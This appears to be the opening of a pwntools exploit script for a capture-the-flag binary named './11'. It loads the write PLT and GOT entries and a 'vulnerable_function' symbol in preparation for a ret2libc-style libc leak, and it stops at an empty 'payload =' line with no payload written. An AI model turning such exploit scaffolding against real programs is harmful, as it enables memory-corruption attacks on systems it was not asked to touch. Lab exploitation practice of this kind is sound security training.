from pwn import *
from LibcSearcher import *

p = process('./11')
elf = ELF('./11')
write_plt = elf.plt['write']
write_got = elf.got['write']
v = elf.symbols['vulnerable_function']

payload =  
